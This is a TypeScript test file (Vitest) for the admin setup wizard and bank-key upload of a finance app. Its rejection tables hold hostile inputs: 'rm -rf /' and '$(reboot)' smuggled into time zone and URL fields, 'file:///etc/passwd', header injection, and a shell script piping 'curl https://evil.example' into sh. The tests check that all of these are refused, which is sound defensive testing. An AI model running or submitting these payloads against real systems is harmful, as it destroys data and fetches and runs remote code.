import { createPublicKey, createVerify, generateKeyPairSync, randomUUID, X509Certificate } from "node:crypto";
import { describe, expect, it } from "vitest";
import { loadConfig } from "../src/config.ts";
import { NOW, setupApp } from "./helpers.ts";
import { mockBank } from "./mock-bank.ts";

const pkcs8 = (bits = 2048) => generateKeyPairSync("rsa", { modulusLength: bits }).privateKey.export({ type: "pkcs8", format: "pem" }).toString();
const pkcs1 = generateKeyPairSync("rsa", { modulusLength: 2048 }).privateKey.export({ type: "pkcs1", format: "pem" }).toString();

describe("setup wizard: instance settings", () => {
  it("is admin only and starts with the environment defaults", async () => {
    const { admin, member } = await setupApp({ INDUSTRY_LOOKUP: "true" });
    const eero = await member("eero");
    expect((await eero.call("GET", "/api/admin/instance")).status).toBe(403);
    expect((await eero.call("PUT", "/api/admin/instance", { timezone: "UTC" })).status).toBe(403);
    expect((await eero.call("GET", "/api/meta")).body.setupDone).toBe(false);

    const r = await admin.call("GET", "/api/admin/instance");
    expect(r.body.settings).toEqual({ appBaseUrl: "http://localhost:8080", timezone: "Europe/Helsinki", syncHours: [6, 18], historyDays: 730, industryLookup: true, setupDone: false, redirectMode: null });
    expect(r.body.secret.available).toBe(true);
    expect(r.body.bankApp).toMatchObject({ source: null, canStoreKeys: true, redirectUrl: "https://jouni-mikkola.github.io/omatalous/paluu/", redirectMode: "relay" });
  });

  it("without APP_BASE_URL the default address is this machine at the port the server listens on", () => {
    expect(loadConfig({ PORT: "8141" }).defaults.appBaseUrl).toBe("http://localhost:8141");
    expect(loadConfig({}).defaults.appBaseUrl).toBe("http://localhost:8080");
    expect(loadConfig({}).defaults.industryLookup).toBe(true);
    expect(loadConfig({ PORT: "8141", APP_BASE_URL: "https://talous.example.fi/" }).defaults.appBaseUrl).toBe("https://talous.example.fi");
  });

  it("saves valid settings to the database and uses them at once", async () => {
    const { admin, s } = await setupApp();
    const r = await admin.call("PUT", "/api/admin/instance", {
      appBaseUrl: "https://talous.example.fi/",
      timezone: "Pacific/Kiritimati", // UTC+14: already tomorrow
      syncHours: [18, 6, 6],
      historyDays: 365,
    });
    expect(r.status).toBe(200);
    expect(r.body.settings).toMatchObject({ appBaseUrl: "https://talous.example.fi", syncHours: [6, 18], historyDays: 365 });
    expect(r.body.bankApp.redirectUrl).toBe("https://talous.example.fi/api/connections/callback");
    expect(s.today()).toBe("2026-10-10");
    expect(JSON.parse((await s.settings.get("instance_settings"))!)).toMatchObject({ timezone: "Pacific/Kiritimati" });
    expect((await admin.call("GET", "/api/meta")).body.today).toBe("2026-10-10");

    // the new address is an accepted origin; another site is not
    expect((await admin.call("PUT", "/api/admin/instance", { historyDays: 180 }, { Origin: "https://talous.example.fi" })).status).toBe(200);
    expect((await admin.call("PUT", "/api/admin/instance", { historyDays: 180 }, { Origin: "https://evil.example" })).status).toBe(403);

    expect((await admin.call("POST", "/api/admin/instance/complete")).body.settings.setupDone).toBe(true);
    expect((await admin.call("GET", "/api/meta")).body.setupDone).toBe(true);
  });

  it.each([
    ["javascript URL", { appBaseUrl: "javascript:alert(1)" }],
    ["file URL", { appBaseUrl: "file:///etc/passwd" }],
    ["credentials in URL", { appBaseUrl: "https://admin:pw@talous.example.fi" }],
    ["path", { appBaseUrl: "https://talous.example.fi/../../bin" }],
    ["query", { appBaseUrl: "https://talous.example.fi/?x=1" }],
    ["shell in host name", { appBaseUrl: "https://$(reboot).example.fi" }],
    ["newline", { appBaseUrl: "https://talous.example.fi\nX-Evil: 1" }],
    ["path as time zone", { timezone: "../../etc/passwd" }],
    ["command as time zone", { timezone: "Europe/Helsinki; rm -rf /" }],
    ["unknown time zone", { timezone: "Mars/Olympus_Mons" }],
    ["five sync times", { syncHours: [1, 2, 3, 4, 5] }],
    ["hour 24", { syncHours: [24] }],
    ["hour as text", { syncHours: ["6"] }],
    ["fractional hour", { syncHours: [6.5] }],
    ["too little history", { historyDays: 5 }],
    ["history as text", { historyDays: "730" }],
    ["lookup flag as text", { industryLookup: "true" }],
    ["unknown field", { timezone: "UTC", shell: "/bin/sh" }],
    ["array body", [1, 2]],
    ["string body", "Europe/Helsinki"],
  ])("refuses %s and changes nothing", async (_name, payload) => {
    const { admin, s } = await setupApp();
    const r = await admin.call("PUT", "/api/admin/instance", payload);
    expect(r.status).toBe(400);
    expect(typeof r.body.error).toBe("string");
    expect(await s.settings.get("instance_settings")).toBeNull();
  });

  it("requires the CSRF header", async () => {
    const { admin } = await setupApp();
    expect((await admin.call("PUT", "/api/admin/instance", { historyDays: 90 }, { "X-Requested-With": "" })).status).toBe(403);
  });

  it("falls back to the defaults when the stored row is invalid", async () => {
    const { admin, s } = await setupApp();
    await s.settings.set("instance_settings", JSON.stringify({ appBaseUrl: "javascript:alert(1)", setupDone: true }));
    await s.instance.load(true);
    const r = await admin.call("GET", "/api/admin/instance");
    expect(r.body.settings.appBaseUrl).toBe("http://localhost:8080");
  });
});

describe("setup wizard: shared Enable Banking app", () => {
  it("generates the key on the server, hands out only the certificate, and activates with the Application ID", async () => {
    const bank = mockBank();
    const { admin, member, s, app } = await setupApp({}, bank.fetchMock);

    const gen = await admin.call("POST", "/api/admin/bank-app/key");
    expect(gen.status).toBe(200);
    expect(gen.body.bankApp).toMatchObject({ source: null, hasCertificate: true });
    expect(gen.body.bankApp.pendingSince).toBe(NOW.toISOString());
    expect(JSON.stringify(gen.body)).not.toContain("PRIVATE KEY");

    const download = await admin.call("GET", "/api/admin/bank-app/certificate");
    expect(download.res.headers.get("content-disposition")).toContain("attachment");
    expect(download.body).not.toContain("PRIVATE KEY");
    const cert = new X509Certificate(download.body);
    expect(cert.verify(cert.publicKey)).toBe(true); // self-signed
    expect(cert.subject).toBe("CN=talous localhost");

    // the private key is only stored sealed
    const rows = await s.db.all<{ key: string; value: string }>("SELECT key, value FROM settings");
    expect(rows.some((r) => r.value.includes("PRIVATE KEY"))).toBe(false);

    expect((await admin.call("PUT", "/api/admin/bank-app", { appId: "not-an-id" })).status).toBe(400);
    const appId = randomUUID();
    const done = await admin.call("PUT", "/api/admin/bank-app", { appId });
    expect(done.status).toBe(200);
    expect(done.body.result.verified).toBe(true);
    expect(done.body.bankApp).toMatchObject({ source: "web", appId, pendingSince: null, hasCertificate: true });

    // the test request was signed by the key whose certificate was downloaded
    const [header, payload, signature] = bank.tokens.at(-1)!.split(".");
    const ok = createVerify("RSA-SHA256").update(`${header}.${payload}`).verify(createPublicKey(cert.publicKey.export({ type: "spki", format: "pem" })), Buffer.from(signature!, "base64url"));
    expect(ok).toBe(true);
    expect(bank.appIds.has(appId)).toBe(true);

    // members use the shared app without seeing it
    const eero = await member("eero");
    expect((await eero.call("GET", "/api/meta")).body.bank).toMatchObject({ configured: true, source: "instance", banks: [{ id: "nordea-fi", name: "Nordea", country: "FI" }] });
    expect((await eero.call("GET", "/api/admin/bank-app/certificate")).status).toBe(403);
    expect((await eero.call("POST", "/api/connections/start", { bank: "nordea-fi" })).body.url).toBe("https://auth.enablebanking.com/consent?x=1");
    void app;
  });

  it("keeps the settings when Enable Banking rejects the key and says why", async () => {
    const bank = mockBank();
    bank.status = 401;
    const { admin } = await setupApp({}, bank.fetchMock);
    await admin.call("POST", "/api/admin/bank-app/key");
    const r = await admin.call("PUT", "/api/admin/bank-app", { appId: randomUUID() });
    expect(r.status).toBe(200);
    expect(r.body.result.verified).toBe(false);
    expect(r.body.result.message).toContain("401");
    expect(r.body.bankApp.source).toBe("web");
    bank.status = 200;
    expect((await admin.call("POST", "/api/admin/bank-app/test")).body.result.verified).toBe(true);
  });

  it("accepts a .pem from Enable Banking (PKCS#8 or PKCS#1) and stores its own re-encoding", async () => {
    const bank = mockBank();
    const { admin, s } = await setupApp({}, bank.fetchMock);
    for (const key of [pkcs8(), pkcs1, pkcs1.replace(/\n/g, "\r\n")]) {
      const r = await admin.call("PUT", "/api/admin/bank-app", { appId: randomUUID(), privateKeyPem: key });
      expect(r.status).toBe(200);
      expect(r.body.bankApp).toMatchObject({ source: "web", hasCertificate: false });
    }
    const rows = await s.db.all<{ value: string }>("SELECT value FROM settings");
    expect(rows.some((r) => r.value.includes("PRIVATE KEY"))).toBe(false);
  });

  const key = pkcs8();
  it.each([
    ["an ELF binary", "\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00"],
    ["a Windows executable", `MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff${"A".repeat(40)}`],
    ["a shell script", "#!/bin/sh\ncurl https://evil.example | sh\n"],
    ["a script after the key", `${key}\n#!/bin/sh\nrm -rf /\n`],
    ["text before the key", `echo pwned\n${key}`],
    ["a certificate instead of a key", "-----BEGIN CERTIFICATE-----\nMIIBszCCAVmgAwIBAgIU\n-----END CERTIFICATE-----\n"],
    ["an encrypted key", "-----BEGIN ENCRYPTED PRIVATE KEY-----\nMIIBszCCAVmgAwIBAgIU\n-----END ENCRYPTED PRIVATE KEY-----\n"],
    ["an EC key", generateKeyPairSync("ec", { namedCurve: "P-256" }).privateKey.export({ type: "pkcs8", format: "pem" }).toString()],
    ["a 1024-bit key", pkcs8(1024)],
    ["base64 garbage", "-----BEGIN PRIVATE KEY-----\nTm90IGEga2V5IGF0IGFsbA==\n-----END PRIVATE KEY-----\n"],
    ["an oversized file", `-----BEGIN PRIVATE KEY-----\n${"A".repeat(20_000)}\n-----END PRIVATE KEY-----\n`],
    ["a number", 42],
  ])("refuses %s as the private key", async (_name, privateKeyPem) => {
    const { admin, s } = await setupApp({}, mockBank().fetchMock);
    const r = await admin.call("PUT", "/api/admin/bank-app", { appId: randomUUID(), privateKeyPem });
    expect(r.status).toBe(400);
    expect(await s.settings.get("instance_bank_app")).toBeNull();
  });

  it("refuses bank ids outside the registry and free-form bank names", async () => {
    const bank = mockBank();
    const { admin } = await setupApp({ EB_APP_ID: randomUUID(), EB_PRIVATE_KEY: pkcs8() }, bank.fetchMock);
    expect((await admin.call("POST", "/api/connections/start", { bank: "evil-bank" })).status).toBe(400);
    expect((await admin.call("POST", "/api/connections/start", { aspspName: "Evil", country: "FI" })).status).toBe(400);
    expect(bank.calls.filter((c) => c.startsWith("POST /auth"))).toEqual([]);
  });

  it("cannot store keys without the app secret", async () => {
    const { admin } = await setupApp({ APP_SECRET: "" });
    const r = await admin.call("POST", "/api/admin/bank-app/key");
    expect(r.status).toBe(400);
    expect(r.body.error).toContain("salausavain");
    expect((await admin.call("GET", "/api/admin/instance")).body.secret.available).toBe(false);
  });

  it("removing the saved app falls back to the environment's app", async () => {
    const envAppId = randomUUID();
    const { admin } = await setupApp({ EB_APP_ID: envAppId, EB_PRIVATE_KEY: pkcs8() }, mockBank().fetchMock);
    await admin.call("PUT", "/api/admin/bank-app", { appId: randomUUID(), privateKeyPem: pkcs8() });
    const r = await admin.call("DELETE", "/api/admin/bank-app");
    expect(r.body.bankApp).toMatchObject({ source: "env", appId: envAppId });
  });
});

describe("shared app sealed with another secret", () => {
  it("is treated as missing instead of failing with a 500", async () => {
    const bank = mockBank();
    const first = await setupApp({}, bank.fetchMock);
    await first.admin.call("PUT", "/api/admin/bank-app", { appId: randomUUID(), privateKeyPem: pkcs8() });
    const row = await first.s.settings.get("instance_bank_app");

    const second = await setupApp({ APP_SECRET: "another-secret-that-is-long-enough-987654" }, bank.fetchMock);
    await second.s.settings.set("instance_bank_app", row!);
    const r = await second.admin.call("POST", "/api/connections/start", { bank: "nordea-fi" });
    expect(r.status).toBe(400);
    expect(r.body.error).toContain("ylläpitäjä");
  });
});
